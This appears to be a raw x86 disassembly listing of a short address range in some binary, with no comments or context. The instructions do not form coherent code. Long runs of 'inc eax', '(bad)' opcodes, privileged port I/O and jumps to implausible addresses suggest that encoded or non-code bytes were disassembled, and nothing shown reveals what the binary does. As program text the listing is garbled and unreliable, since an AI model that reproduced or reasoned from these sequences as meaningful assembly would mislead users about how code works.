  413b7e:	inc    eax
  413b7f:	inc    eax
  413b80:	inc    eax
  413b81:	inc    eax
  413b82:	inc    eax
  413b83:	inc    eax
  413b84:	gs inc esi
  413b86:	inc    eax
  413b87:	inc    edx
  413b88:	push   0x64
  413b8a:	jo     0x413bef
  413b8c:	inc    ebx
  413b8d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413b8e:	inc    eax
  413b8f:	mov    cl,0x24
  413b91:	aad    0xc
  413b93:	sub    dl,cl
  413b95:	mov    dl,BYTE PTR [edx]
  413b97:	inc    ebx
  413b98:	sbb    eax,0x956a31f7
  413b9d:	stos   BYTE PTR es:[edi],al
  413b9e:	loop   0x413b71
  413ba0:	mov    dh,bh
  413ba2:	sub    bh,BYTE PTR [ecx]
  413ba4:	ins    DWORD PTR es:[edi],dx
  413ba5:	in     al,0x40
  413ba7:	inc    eax
  413ba8:	inc    eax
  413ba9:	inc    eax
  413baa:	inc    eax
  413bab:	inc    eax
  413bac:	rol    DWORD PTR [eax+0x40],0xc1
  413bb0:	inc    edx
  413bb1:	jo     0x413bf7
  413bb3:	retf   
  413bb4:	bound  eax,QWORD PTR [edi]
  413bb6:	loope  0x413b3d
  413bb8:	cmc    
  413bb9:	cvttps2pi mm4,QWORD PTR [edi+eax*2]
  413bbd:	or     al,BYTE PTR [esi+0x40]
  413bc0:	inc    eax
  413bc1:	add    BYTE PTR [eax+0x40],al
  413bc4:	inc    eax
  413bc5:	inc    eax
  413bc6:	inc    eax
  413bc7:	inc    eax
  413bc8:	rol    DWORD PTR [ebx-0x3],0x62
  413bcc:	shr    ah,cl
  413bce:	inc    ecx
  413bcf:	stc    
  413bd0:	inc    edi
  413bd1:	icebp  
  413bd2:	gs int 0x63
  413bd5:	mov    al,0x43
  413bd7:	lahf   
  413bd8:	shl    BYTE PTR [edi+0x29],0x71
  413bdc:	inc    eax
  413bdd:	inc    eax
  413bde:	inc    eax
  413bdf:	inc    eax
  413be0:	inc    eax
  413be1:	inc    eax
  413be2:	inc    eax
  413be3:	inc    eax
  413be4:	inc    eax
  413be5:	inc    eax
  413be6:	rol    DWORD PTR ds:0xf52c2f30,cl
  413bec:	aam    0x92
  413bee:	int3   
  413bef:	add    DWORD PTR [eax+0x5dbfc8d8],edx
  413bf5:	fs mov ah,0x26
  413bf8:	inc    edi
  413bf9:	ja     0x413bbc
  413bfb:	cmp    al,BYTE PTR [eax+0x40]
  413bfe:	inc    eax
  413bff:	inc    eax
  413c00:	inc    eax
  413c01:	inc    eax
  413c02:	int3   
  413c03:	jne    0x413c45
  413c05:	and    al,0x44
  413c07:	adc    eax,0xdf488552
  413c0c:	xor    ecx,esp
  413c0e:	sub    al,0xfb
  413c10:	or     al,0x43
  413c12:	jl     0x413bd6
  413c14:	imul   edi,DWORD PTR [edi-0x6fcbdda0],0xf
  413c1b:	jnp    0x413bce
  413c1d:	mov    edi,0x24053c5
  413c22:	punpcklbw mm3,DWORD PTR [esi+ebp*4+0x71]
  413c27:	les    ebp,FWORD PTR [edx+0x43]
  413c2a:	xchg   ebx,eax
  413c2b:	inc    eax
  413c2c:	add    cl,al
  413c2e:	inc    eax
  413c2f:	inc    eax
  413c30:	inc    eax
  413c31:	inc    eax
  413c32:	add    BYTE PTR [eax+0x76],al
  413c35:	mov    al,0x7c
  413c37:	xchg   edx,eax
  413c38:	dec    edi
  413c39:	aaa    
  413c3a:	shl    DWORD PTR [edi],1
  413c3c:	ret    
  413c3d:	xor    ch,BYTE PTR [eax-0x1f9b8e9c]
  413c43:	inc    eax
  413c44:	inc    eax
  413c45:	inc    eax
  413c46:	inc    eax
  413c47:	inc    eax
  413c48:	inc    eax
  413c49:	inc    eax
  413c4a:	inc    eax
  413c4b:	inc    DWORD PTR [eax-0x4]
  413c4e:	push   0x4244435f
  413c53:	jne    0x413c0a
  413c55:	lock shl DWORD PTR [ecx],0x40
  413c59:	sub    al,0x62
  413c5b:	rcl    BYTE PTR [ebx+0x380e4bf5],0x5e
  413c62:	pusha  
  413c63:	inc    eax
  413c64:	inc    eax
  413c65:	inc    eax
  413c66:	inc    eax
  413c67:	inc    eax
  413c68:	inc    eax
  413c69:	inc    eax
  413c6a:	inc    eax
  413c6b:	inc    eax
  413c6c:	inc    eax
  413c6d:	pop    ecx
  413c6e:	jno    0x413ce0
  413c70:	shl    BYTE PTR [ecx],0xe3
  413c73:	aad    0xb8
  413c75:	pop    ebx
  413c76:	inc    ecx
  413c77:	pop    esp
  413c78:	pusha  
  413c79:	jne    0x413c1b
  413c7b:	inc    eax
  413c7c:	inc    eax
  413c7d:	inc    eax
  413c7e:	inc    eax
  413c7f:	inc    eax
  413c80:	inc    eax
  413c81:	inc    eax
  413c82:	inc    eax
  413c83:	add    BYTE PTR [esi],al
  413c85:	bound  edi,QWORD PTR [eax+0x59558f43]
  413c8b:	xchg   ecx,eax
  413c8c:	dec    edx
  413c8d:	dec    edi
  413c8e:	xor    BYTE PTR cs:[edx],bh
  413c91:	ret    0x4742
  413c94:	fs xor bl,cl
  413c97:	or     BYTE PTR [ecx+eiz*1-0x6bbbd0a9],0x21
  413c9f:	inc    edi
  413ca0:	cmp    BYTE PTR [esi+0x40],dl
  413ca3:	inc    eax
  413ca4:	inc    eax
  413ca5:	inc    eax
  413ca6:	inc    eax
  413ca7:	inc    eax
  413ca8:	and    eax,0xaf404040
  413cad:	loope  0x413cdb
  413caf:	lods   al,BYTE PTR ds:[esi]
  413cb0:	xor    al,0x85
  413cb2:	inc    edx
  413cb3:	ror    DWORD PTR [esi],0x0
  413cb6:	pop    esp
  413cb7:	test   al,0x50
  413cb9:	inc    ebx
  413cba:	je     0x413cf1
  413cbc:	xchg   esp,eax
  413cbd:	in     eax,0xcd
  413cbf:	adc    DWORD PTR [edi],esp
  413cc1:	nop
  413cc2:	mov    esp,DWORD PTR [eax+0x60]
  413cc5:	inc    eax
  413cc6:	inc    eax
  413cc7:	inc    eax
  413cc8:	inc    eax
  413cc9:	inc    eax
  413cca:	inc    eax
  413ccb:	inc    eax
  413ccc:	inc    eax
  413ccd:	inc    eax
  413cce:	inc    eax
  413ccf:	mov    ds:0x1f874159,al
  413cd4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413cd5:	ret    0x9172
  413cd8:	into   
  413cd9:	cs or  al,0x43
  413cdc:	cmp    eax,0x177f9127
  413ce1:	adc    al,0x62
  413ce3:	sar    DWORD PTR [esi-0x2e],1
  413ce6:	inc    eax
  413ce7:	mov    BYTE PTR [eax+0x40],0x40
  413ceb:	inc    eax
  413cec:	inc    eax
  413ced:	inc    eax
  413cee:	rol    DWORD PTR [eax+0x40],0x44
  413cf2:	fs push eax
  413cf4:	mov    eax,ds:0xcb30c476
  413cf9:	sub    eax,0xc4ff2410
  413cfe:	sub    ecx,DWORD PTR es:[edx+0x5a]
  413d02:	add    ch,dh
  413d04:	(bad)  
  413d05:	out    dx,eax
  413d06:	fiadd  WORD PTR [ebp+ebx*8-0x3b]
  413d0a:	retf   
  413d0b:	mov    al,0x40
  413d0d:	inc    eax
  413d0e:	add    BYTE PTR [eax+0x40],al
  413d11:	inc    eax
  413d12:	inc    eax
  413d13:	inc    eax
  413d14:	inc    eax
  413d15:	adc    edi,ebp
  413d17:	ret    
  413d18:	and    cl,cl
  413d1a:	fdiv   DWORD PTR [eax+0x14ab41a8]
  413d20:	xor    ah,BYTE PTR [ecx+0x4332158a]
  413d26:	mov    bl,0xc2
  413d28:	inc    ebx
  413d29:	xchg   ecx,eax
  413d2a:	mov    edi,0xe8309742
  413d2f:	and    esp,DWORD PTR [eax+0x49]
  413d32:	mov    edi,0xcdfc6246
  413d37:	dec    eax
  413d38:	cmc    
  413d39:	(bad)  
  413d3a:	mov    esi,0x40404040
  413d3f:	inc    eax
  413d40:	inc    eax
  413d41:	inc    eax
  413d42:	inc    eax
  413d43:	inc    eax
  413d44:	inc    eax
  413d45:	cmp    BYTE PTR [edi+eax*2+0x3d],al
  413d49:	rcl    DWORD PTR [ebx],0x42
  413d4c:	pop    eax
  413d4d:	sub    DWORD PTR [edx],ebp
  413d4f:	test   DWORD PTR [ebx-0x13],eax
  413d52:	jbe    0x413ce0
  413d54:	aad    0xdd
  413d56:	retf   0x7743
  413d59:	in     eax,0xe1
  413d5b:	push   0x907eb942
  413d60:	loope  0x413d23
  413d62:	ins    DWORD PTR es:[edi],dx
  413d63:	inc    edx
  413d64:	pusha  
  413d65:	push   edi
  413d66:	bound  eax,QWORD PTR [eax+0x40]
  413d69:	inc    eax
  413d6a:	inc    eax
  413d6b:	inc    eax
  413d6c:	inc    eax
  413d6d:	int3   
  413d6e:	jne    0x413db0
  413d70:	cmp    al,0x64
  413d72:	inc    edi
  413d73:	mov    eax,ds:0x1170f0f8
  413d78:	inc    ebx
  413d79:	mov    ch,0xc0
  413d7b:	inc    ebx
  413d7c:	push   es
  413d7d:	cli    
  413d7e:	sub    al,0xb0
  413d80:	rcr    DWORD PTR [ecx+0x24],1
  413d83:	loope  0x413d2d
  413d85:	mov    edi,0x1846064
  413d8a:	bound  edx,QWORD PTR [esi+eax*2-0x41]
  413d8e:	inc    eax
  413d8f:	add    cl,al
  413d91:	inc    eax
  413d92:	inc    eax
  413d93:	inc    eax
  413d94:	inc    eax
  413d95:	add    BYTE PTR [eax+0x6e],al
  413d98:	inc    esi
  413d99:	hlt    
  413d9a:	out    0xc0,eax
  413d9c:	out    0x2a,al
  413d9e:	mov    esi,0x3ae96235
  413da3:	ss ins BYTE PTR es:[edi],dx
  413da5:	adc    BYTE PTR [esi-0x2f],dl
  413da8:	cs or  eax,0x425425de
  413dae:	inc    edx
  413daf:	inc    eax
  413db0:	inc    eax
  413db1:	inc    eax
  413db2:	inc    eax
  413db3:	inc    eax
  413db4:	inc    eax
  413db5:	inc    eax
  413db6:	inc    eax
  413db7:	inc    DWORD PTR [eax+0x2e]
  413dba:	mov    al,0x41
  413dbc:	mov    al,0xc2
  413dbe:	xor    DWORD PTR [esi+0x78],edx
  413dc1:	cmp    al,0x62
  413dc3:	inc    ebx
  413dc4:	mov    al,0x33
  413dc6:	and    BYTE PTR [eax],bh
  413dc8:	cwde   
  413dc9:	les    esi,FWORD PTR [eax+0x616f5730]
  413dcf:	inc    eax
  413dd0:	inc    eax
  413dd1:	inc    eax
  413dd2:	inc    eax
  413dd3:	inc    eax
  413dd4:	inc    eax
  413dd5:	inc    eax
  413dd6:	inc    eax
  413dd7:	inc    eax
  413dd8:	inc    eax
  413dd9:	loope  0x413e43
  413ddb:	dec    edi
  413ddc:	add    eax,0x3bc1ab84
  413de1:	adc    bh,BYTE PTR [esi-0x55b878bf]
  413de7:	xchg   ebp,eax
  413de8:	inc    eax
  413de9:	push   esi
  413dea:	inc    eax
  413deb:	inc    eax
  413dec:	inc    eax
  413ded:	inc    eax
  413dee:	inc    eax
  413def:	inc    eax
  413df0:	inc    eax
  413df1:	inc    eax
  413df2:	add    BYTE PTR [esi+esi*1-0x2e],dl
  413df6:	test   DWORD PTR [ebp-0x3ac99eec],ecx
  413dfc:	xor    ebx,DWORD PTR [ebx+0x48cdfe43]
  413e02:	push   ebp
  413e03:	add    dh,ah
  413e05:	jb     0x413d97
  413e07:	jge    0x413e68
  413e09:	test   eax,0xd86307cb
  413e0e:	fnstenv [ecx+eax*8+0x40404020]
  413e15:	inc    eax
  413e16:	inc    eax
  413e17:	inc    eax
  413e18:	and    eax,0x42404040
  413e1d:	mov    gs:0x7ffe4352,eax
  413e23:	sub    edi,edx
  413e25:	inc    eax
  413e26:	inc    esp
  413e27:	dec    ecx
  413e28:	rcl    DWORD PTR [esi-0x40],1
  413e2b:	and    BYTE PTR ds:0x6538a840,bl
  413e31:	rol    BYTE PTR [eax+0x40],0x40
  413e35:	inc    eax
  413e36:	inc    eax
  413e37:	inc    eax
  413e38:	inc    eax
  413e39:	inc    eax
  413e3a:	inc    eax
  413e3b:	inc    eax
  413e3c:	and    eax,0x484ca83f
  413e41:	nop
  413e42:	pop    ecx
  413e43:	in     eax,0x59
  413e45:	and    BYTE PTR [ebp+0x9],al
  413e48:	xor    eax,0x4040f1bf
  413e4d:	inc    eax
  413e4e:	inc    eax
  413e4f:	inc    eax
  413e50:	inc    eax
  413e51:	rol    DWORD PTR [eax+0x40],0x1d
  413e55:	ret    0x2a3f
  413e58:	test   eax,0x5a1a4042
  413e5d:	adc    eax,0x6eb81120
  413e62:	fiadd  DWORD PTR [ecx-0xd]
  413e65:	sbb    eax,0x40004040
  413e6a:	inc    eax
  413e6b:	inc    eax
  413e6c:	inc    eax
  413e6d:	inc    eax
  413e6e:	inc    eax
  413e6f:	aas    
  413e70:	inc    edx
  413e71:	inc    ebx
  413e72:	xor    al,0x52
  413e74:	inc    ebx
  413e75:	fwait
  413e76:	lds    eax,FWORD PTR [ebx+0x78]
  413e79:	pop    ss
  413e7a:	in     eax,dx
  413e7b:	shl    BYTE PTR [eax],0x15
  413e7e:	daa    
  413e7f:	popa   
  413e80:	inc    eax
  413e81:	inc    eax
  413e82:	inc    eax
  413e83:	inc    eax
  413e84:	inc    eax
  413e85:	inc    eax
  413e86:	inc    eax
  413e87:	inc    eax
  413e88:	inc    eax
  413e89:	inc    eax
  413e8a:	enter  0x6c60,0x44
  413e8e:	clc    
  413e8f:	inc    eax
  413e90:	ret    
  413e91:	or     cl,bl
  413e93:	arpl   WORD PTR fs:[ecx],bp
  413e96:	dec    esi
  413e97:	(bad)  [ebx-0x9e8ef1d]
  413e9d:	arpl   WORD PTR [ebp+0x56bf4f9b],cx
  413ea3:	ror    ah,0xa8
  413ea6:	inc    eax
  413ea7:	inc    eax
  413ea8:	inc    eax
  413ea9:	inc    eax
  413eaa:	inc    eax
  413eab:	inc    eax
  413eac:	int3   
  413ead:	jne    0x413eef
  413eaf:	inc    ebx
  413eb0:	ffree  st(0)
  413eb2:	push   eax
  413eb3:	ss dec esp
  413eb5:	bound  edx,QWORD PTR [edx]
  413eb7:	nop
  413eb8:	int3   
  413eb9:	(bad)
  413ebf:	test   BYTE PTR [esi],0x45
  413ec2:	xor    eax,0x40a9314c
  413ec7:	add    cl,al
  413ec9:	inc    eax
  413eca:	inc    eax
  413ecb:	inc    eax
  413ecc:	inc    eax
  413ecd:	add    BYTE PTR [eax+0x43],al
  413ed0:	inc    ebx
  413ed1:	out    0xc0,eax
  413ed3:	data16 test BYTE PTR [edx-0xe],ah
  413ed7:	shr    DWORD PTR ds:0x212d,1
  413edc:	test   eax,0xafaa0e40
  413ee1:	inc    eax
  413ee2:	inc    eax
  413ee3:	inc    eax
  413ee4:	inc    eax
  413ee5:	inc    eax
  413ee6:	inc    eax
  413ee7:	inc    eax
  413ee8:	inc    eax
  413ee9:	inc    DWORD PTR [eax+0x30]
  413eec:	bound  ebp,QWORD PTR [ebp+0x2f]
  413eef:	dec    eax
  413ef0:	bound  esp,QWORD PTR [edi+eax*4]
  413ef3:	inc    ebx
  413ef4:	shl    BYTE PTR [ecx],0x62
  413ef7:	dec    esp
  413ef8:	repz cld 
  413efa:	stos   BYTE PTR es:[edi],al
  413efb:	mov    ebx,0x40404040
  413f00:	inc    eax
  413f01:	inc    eax
  413f02:	inc    eax
  413f03:	inc    eax
  413f04:	inc    eax
  413f05:	inc    eax
  413f06:	and    DWORD PTR [esp+esi*1],esp
  413f09:	or     bl,ah
  413f0b:	shl    BYTE PTR [edi+eiz*8],0xe
  413f0f:	cmp    DWORD PTR [eax+0x41629e67],ebp
  413f15:	inc    ebp
  413f16:	shl    BYTE PTR [esp+eax*2],0x10
  413f1a:	xor    al,0xc4
  413f1c:	inc    ebx
  413f1d:	push   edx
  413f1e:	and    edi,DWORD PTR [edi]
  413f20:	sub    dl,BYTE PTR [eax]
  413f22:	test   al,0x4f
  413f24:	xor    dl,cl
  413f26:	inc    eax
  413f27:	inc    eax
  413f28:	inc    eax
  413f29:	inc    eax
  413f2a:	inc    eax
  413f2b:	inc    eax
  413f2c:	inc    eax
  413f2d:	inc    eax
  413f2e:	add    dl,ch
  413f30:	adc    BYTE PTR [edx],dl
  413f32:	bound  eax,QWORD PTR ds:0x356f48e
  413f38:	jg     0x413f7c
  413f3a:	push   es
  413f3b:	xchg   DWORD PTR [edx],edi
  413f3d:	inc    edi
  413f3e:	shl    DWORD PTR cs:[ebp+0x57],0x3c
  413f43:	inc    eax
  413f44:	inc    eax
  413f45:	inc    eax
  413f46:	inc    eax
  413f47:	inc    eax
  413f48:	inc    eax
  413f49:	and    eax,0x68404040
  413f4e:	inc    eax
  413f4f:	test   DWORD PTR [eax],esp
  413f51:	inc    esi
  413f52:	and    esp,DWORD PTR [eax]
  413f54:	arpl   WORD PTR [eax+eax*8-0x3f7fbd],bp
  413f5b:	push   ebp
  413f5c:	push   edx
  413f5d:	ret    
  413f5e:	push   edx
  413f5f:	nop
  413f60:	xchg   ebx,eax
  413f61:	add    eax,0x4314cb0f
  413f66:	rcl    BYTE PTR [ebx+0x11625141],1
  413f6c:	imul   eax,DWORD PTR [edx+0x45],0x40
  413f70:	inc    eax
  413f71:	inc    eax
  413f72:	inc    eax
  413f73:	inc    eax
  413f74:	inc    eax
  413f75:	inc    eax
  413f76:	inc    eax
  413f77:	inc    eax
  413f78:	inc    eax
  413f79:	inc    ebx
  413f7a:	adc    eax,edx
  413f7c:	and    DWORD PTR [esi+0x3b],edx
  413f7f:	cmp    al,0x2d
  413f81:	shl    DWORD PTR [edi+edi*2],1
  413f84:	push   cs
  413f85:	cmp    edi,DWORD PTR [eax]
  413f87:	push   0x27f7e706
  413f8c:	bound  ecx,QWORD PTR [ebp+0x6]
  413f8f:	inc    esi
  413f90:	test   al,0xbb
  413f92:	sub    al,0xc7
  413f94:	imul   ecx,ebx,0x404040c4
  413f9a:	inc    eax
  413f9b:	inc    eax
  413f9c:	inc    eax
  413f9d:	rol    DWORD PTR [eax+0x40],0xe4
  413fa1:	adc    DWORD PTR [ecx],eax
  413fa3:	inc    si
  413fa5:	pop    ecx
  413fa6:	cmp    BYTE PTR [edx+0xa],ah
  413fa9:	lods   al,BYTE PTR ds:[esi]
  413faa:	and    eax,0x34a0c03e
  413faf:	inc    eax
  413fb0:	test   al,0xd
  413fb2:	inc    ecx
  413fb3:	retf   0x2533
  413fb6:	inc    ecx
  413fb7:	adc    BYTE PTR [ebx+ecx*8+0x40004040],dh
  413fbe:	inc    eax
  413fbf:	inc    eax
  413fc0:	inc    eax
  413fc1:	inc    eax
  413fc2:	inc    eax
  413fc3:	inc    ebx
  413fc4:	inc    ebx
  413fc5:	xchg   esi,eax
  413fc6:	js     0x41400a
  413fc8:	imul   esi,DWORD PTR [esi],0x43
  413fcb:	xor    BYTE PTR [ebp-0x39],dl
  413fce:	popa   
  413fcf:	mov    ah,0xcf
  413fd1:	mov    eax,0x419af05d
  413fd6:	inc    ecx
  413fd7:	add    BYTE PTR [ebx+0x5],ah
  413fda:	and    BYTE PTR [edx-0x52],al
  413fdd:	jecxz  0x41403f
  413fdf:	test   al,0x7d
  413fe1:	leave  
  413fe2:	cmp    al,0xf5
  413fe4:	inc    eax
  413fe5:	inc    eax
  413fe6:	inc    eax
  413fe7:	inc    eax
  413fe8:	inc    eax
  413fe9:	inc    eax
  413fea:	inc    eax
  413feb:	inc    eax
  413fec:	inc    eax
  413fed:	inc    eax
  413fee:	dec    eax
  413fef:	inc    esp
  413ff0:	jmp    0x414035
  413ff2:	addr16 pop eax
  413ff4:	xor    al,0x67
  413ff6:	lds    esi,FWORD PTR [ebx+0x41902a33]
  413ffc:	xor    ebx,DWORD PTR [ecx+0x4f]
  413fff:	inc    eax
  414000:	adc    BYTE PTR [bp+si],ch
  414003:	jne    0x414069
  414005:	enter  0x4080,0x40
  414009:	inc    eax
  41400a:	inc    eax
  41400b:	inc    eax
  41400c:	inc    eax
  41400d:	int3   
  41400e:	jne    0x414050
  414010:	add    esp,DWORD PTR [edi+0x6224c948]
  414016:	mov    al,0x2e
  414018:	inc    eax
  414019:	push   ecx
  41401a:	add    eax,0x433c9278
  41401f:	test   eax,0x8c4460ff
  414024:	pop    ecx
  414025:	test   cl,dl
  414027:	and    eax,DWORD PTR [ebx+0x68]
  41402a:	inc    ebp
  41402b:	bound  ebp,QWORD PTR [eax+0x45d28c66]
  414031:	inc    eax
  414032:	sub    al,0x63
  414034:	pop    edx
  414035:	inc    eax
  414036:	add    cl,al
  414038:	inc    eax
  414039:	inc    eax
  41403a:	inc    eax
  41403b:	inc    eax
  41403c:	add    BYTE PTR [eax+0x3c],al
  41403f:	test   eax,0xca1f8100
  414044:	in     al,0x3b
  414046:	bound  edx,QWORD PTR [esi]
  414048:	add    al,0x8f
  41404a:	push   edx
  41404b:	inc    eax
  41404c:	jmp    0xd29420d1
  414051:	inc    edx
  414052:	and    al,0x15
  414054:	inc    esi
  414055:	add    ch,BYTE PTR [eax]
  414057:	inc    ecx
  414058:	fisubr DWORD PTR [esi+0x6f]
  41405b:	push   0x40915462
  414060:	inc    eax
  414061:	inc    eax
  414062:	inc    eax
  414063:	inc    eax
  414064:	inc    eax
  414065:	inc    eax
  414066:	inc    eax
  414067:	inc    DWORD PTR [eax+0x43]
  41406a:	and    BYTE PTR [edi],ch
  41406c:	and    dl,BYTE PTR [esi]
  41406e:	ja     0x414043
  414070:	mov    edi,0x43454e30
  414075:	test   al,0x20
  414077:	sub    BYTE PTR [eax-0x14],al
  41407a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41407b:	imul   esp,DWORD PTR ds:0x40404042,0x40404040
  414085:	inc    eax
  414086:	inc    eax
  414087:	inc    eax
  414088:	sbb    al,0x40
  41408a:	inc    eax
  41408b:	inc    edi
  41408c:	fild   WORD PTR [ecx+0x44]
  41408f:	sub    ch,BYTE PTR [eax]
  414091:	add    BYTE PTR [edx-0x7b],al
  414094:	adc    al,0x5d
  414096:	pusha  
  414097:	inc    ecx
  414098:	jp     0x414089
  41409a:	pusha  
  41409b:	inc    ebx
  41409c:	add    BYTE PTR [eax+0x27],0x66
  4140a0:	fs inc eax
  4140a2:	inc    ebx
  4140a3:	nop
  4140a4:	push   ds
  4140a5:	and    DWORD PTR [edx],ebx
  4140a7:	cmp    al,0x7b
  4140a9:	sub    bh,ch
  4140ab:	dec    ebp
  4140ac:	stos   BYTE PTR es:[edi],al
  4140ad:	gs inc eax
  4140af:	inc    eax
  4140b0:	inc    eax
  4140b1:	inc    eax
  4140b2:	inc    eax
  4140b3:	inc    eax
  4140b4:	inc    eax
  4140b5:	inc    eax
  4140b6:	add    cl,ah
  4140b8:	sti    
  4140b9:	addr16 inc edi
  4140bb:	and    al,0x43
  4140bd:	es inc ecx
  4140bf:	inc    edx
  4140c0:	xchg   esp,eax
  4140c1:	cmp    DWORD PTR [edi+ebp*8-0x2f],ecx
  4140c5:	clc    
  4140c6:	add    DWORD PTR [eax],esp
  4140c8:	bound  edi,QWORD PTR [edi+0x13493234]
  4140ce:	inc    ecx
  4140cf:	and    DWORD PTR [edi],ebx
  4140d1:	fldcw  WORD PTR [eax]
  4140d3:	test   al,0x1c
  4140d5:	inc    eax
  4140d6:	inc    eax
  4140d7:	inc    eax
  4140d8:	inc    eax
  4140d9:	inc    eax
  4140da:	inc    eax
  4140db:	and    eax,0xc0404040
  4140e0:	sti    
  4140e1:	sub    BYTE PTR [esp+ebp*1+0x61],dh
  4140e5:	adc    BYTE PTR [ebx-0x5f],al
  4140e8:	dec    ebx
  4140e9:	and    DWORD PTR [ebx+0x3c],esp
  4140ec:	pop    ecx
  4140ed:	lods   al,BYTE PTR ds:[esi]
  4140ee:	nop
  4140ef:	ins    DWORD PTR es:[edi],dx
  4140f0:	inc    eax
  4140f1:	inc    ecx
  4140f2:	add    eax,0x414262ff
  4140f7:	adc    eax,0x90dca0a1
  4140fc:	outs   dx,BYTE PTR ds:[esi]
  4140fd:	addr16 inc ebx
  4140ff:	inc    eax
  414100:	inc    eax
  414101:	inc    eax
  414102:	inc    eax
  414103:	inc    eax
  414104:	inc    eax
  414105:	inc    eax
  414106:	inc    eax
  414107:	inc    eax
  414108:	inc    eax
  414109:	bound  edx,QWORD PTR [edi-0x65]
  41410c:	arpl   WORD PTR [eax+0x3c306433],di
  414112:	inc    eax
  414113:	xor    BYTE PTR [edx*1+0x68e8624d],ch
  41411a:	and    al,0x40
  41411c:	test   al,0xc9
  41411e:	push   edx
  41411f:	dec    ecx
  414120:	inc    edi
  414121:	add    eax,0x40402063
  414126:	inc    eax
  414127:	inc    eax
  414128:	inc    eax
  414129:	inc    eax
  41412a:	rol    DWORD PTR [eax+0x40],0x41
  41412e:	hlt    
  41412f:	adc    al,0x20
  414131:	test   DWORD PTR [edi+0x152a2b40],ebp
  414137:	int3   
  414138:	push   edx
  414139:	inc    ebx
  41413a:	push   eax
  41413b:	xor    BYTE PTR ds:0x4040cd11,bl
  414141:	add    BYTE PTR [eax+0x40],al
  414144:	inc    eax
  414145:	inc    eax
  414146:	inc    eax
  414147:	inc    eax
  414148:	arpl   WORD PTR [eax+0x224b6e90],si
  41414e:	dec    eax
  41414f:	xchg   esi,eax
  414150:	pop    esp
  414151:	inc    eax
  414152:	push   0xffffff90
  414154:	inc    edx
  414155:	outs   dx,BYTE PTR ds:[esi]
  414156:	or     eax,0x4340b744
  41415b:	inc    edx
  41415c:	and    al,0x42
  41415e:	inc    esp
  41415f:	cmp    al,0xc1
  414161:	inc    eax
  414162:	rol    DWORD PTR [eax+0x40],1
  414165:	inc    eax
  414166:	inc    eax
  414167:	inc    eax
  414168:	inc    eax
  414169:	inc    eax
  41416a:	inc    eax
  41416b:	inc    eax
  41416c:	inc    eax
  41416d:	and    eax,0xdc6de1ea
  414172:	jmp    0x51be229f
  414177:	inc    eax
  414178:	in     al,dx
  414179:	xchg   esp,eax
  41417a:	inc    eax
  41417b:	inc    eax
  41417c:	inc    eax
  41417d:	inc    eax
  41417e:	inc    eax
  41417f:	inc    eax
  414180:	int3   
  414181:	jne    0x4141c3
  414183:	xchg   esp,eax
  414184:	inc    edx
  414185:	scas   eax,DWORD PTR es:[edi]
  414186:	mov    DWORD PTR [eax+0x60],0x33050562
  41418d:	test   eax,0xfb6f39ae
  414192:	inc    edx
  414193:	xor    al,0x98
  414195:	imul   ecx,DWORD PTR [edx+0x40],0x80c64116
  41419c:	arpl   WORD PTR [ecx+0xa],ax
  41419f:	and    DWORD PTR [eax],esi
  4141a1:	xor    DWORD PTR [ecx-0x3b],ebp
  4141a4:	popa   
  4141a5:	inc    ebx
  4141a6:	push   edx
  4141a7:	jae    0x41420a
  4141a9:	inc    eax
  4141aa:	add    cl,al
  4141ac:	inc    eax
  4141ad:	inc    eax
  4141ae:	inc    eax
  4141af:	inc    eax
  4141b0:	add    BYTE PTR [eax-0x41],al
  4141b3:	clc    
  4141b4:	mov    edi,0x43983038
  4141b9:	or     eax,0x63bf92bf
  4141be:	in     al,0x40
  4141c0:	inc    eax
  4141c1:	inc    eax
  4141c2:	inc    eax
  4141c3:	inc    eax
  4141c4:	inc    eax
  4141c5:	inc    eax
  4141c6:	inc    eax
  4141c7:	inc    DWORD PTR [eax+0x43]
  4141ca:	das    
  4141cb:	popa   
  4141cc:	scas   al,BYTE PTR es:[edi]
  4141cd:	adc    eax,0x5477190
  4141d2:	inc    ecx
  4141d3:	inc    ebx
  4141d4:	dec    edi
  4141d5:	inc    ecx
  4141d6:	pusha  
  4141d7:	test   eax,0xe2096585
  4141dc:	test   al,0xcf
  4141de:	test   al,0xa8
  4141e0:	inc    ebx
  4141e1:	rol    BYTE PTR [edx+0x7a],1
  4141e4:	inc    edx
  4141e5:	in     al,dx
  4141e6:	inc    eax
  4141e7:	inc    eax
  4141e8:	inc    eax
  4141e9:	inc    eax
  4141ea:	inc    eax
  4141eb:	inc    eax
  4141ec:	inc    eax
  4141ed:	inc    eax
  4141ee:	inc    eax
  4141ef:	inc    eax
  4141f0:	push   cs
  4141f1:	add    edx,DWORD PTR [eax+0x1f062ee7]
  4141f7:	cli    
  4141f8:	inc    edi
  4141f9:	jg     0x414202
  4141fb:	stos   BYTE PTR es:[edi],al
  4141fc:	into   
  4141fd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4141fe:	inc    eax
  4141ff:	inc    eax
  414200:	inc    eax
  414201:	inc    eax
  414202:	inc    eax
  414203:	inc    eax
  414204:	inc    eax
  414205:	inc    eax
  414206:	add    BYTE PTR [eax+edx*4-0x15],cl
  41420a:	jns    0x41424f
  41420c:	or     ebx,ebx
  41420e:	cmp    esp,DWORD PTR [edx+0xd]
  414211:	mov    BYTE PTR [ecx+edx*8],dh
  414214:	iret   
  414215:	inc    ebp
  414216:	loope  0x41423d
  414218:	inc    ecx
  414219:	xor    al,0x6b
  41421b:	or     BYTE PTR [edi],dl
  41421d:	add    DWORD PTR [eax+0x24],eax
  414220:	ret    
  414221:	adc    BYTE PTR ds:0xe1412ebe,bh
  414227:	inc    eax
  414228:	inc    eax
  414229:	inc    eax
  41422a:	inc    eax
  41422b:	inc    eax
  41422c:	inc    eax
  41422d:	and    eax,0xc0404040
  414232:	js     0x414286
  414234:	imul   esp,ecx,0xc4486fc9
  41423a:	stc    
  41423b:	ficomp WORD PTR [eax+0x5e]
  41423e:	jmp    0x8e962586
  414243:	test   al,0x63
  414245:	inc    ecx
  414246:	dec    ecx
  414247:	sbb    DWORD PTR [edi+0x4040403f],ebp
  41424d:	inc    eax
  41424e:	inc    eax
  41424f:	inc    eax
  414250:	inc    eax
  414251:	inc    eax
  414252:	inc    eax
  414253:	inc    eax
  414254:	add    eax,0x1143dd1c
  414259:	inc    edx
  41425a:	dec    ebp
  41425b:	test   al,0x41
  41425d:	push   edx
  41425e:	inc    edx
  41425f:	xor    cl,dl
  414261:	and    eax,0x63416ae2
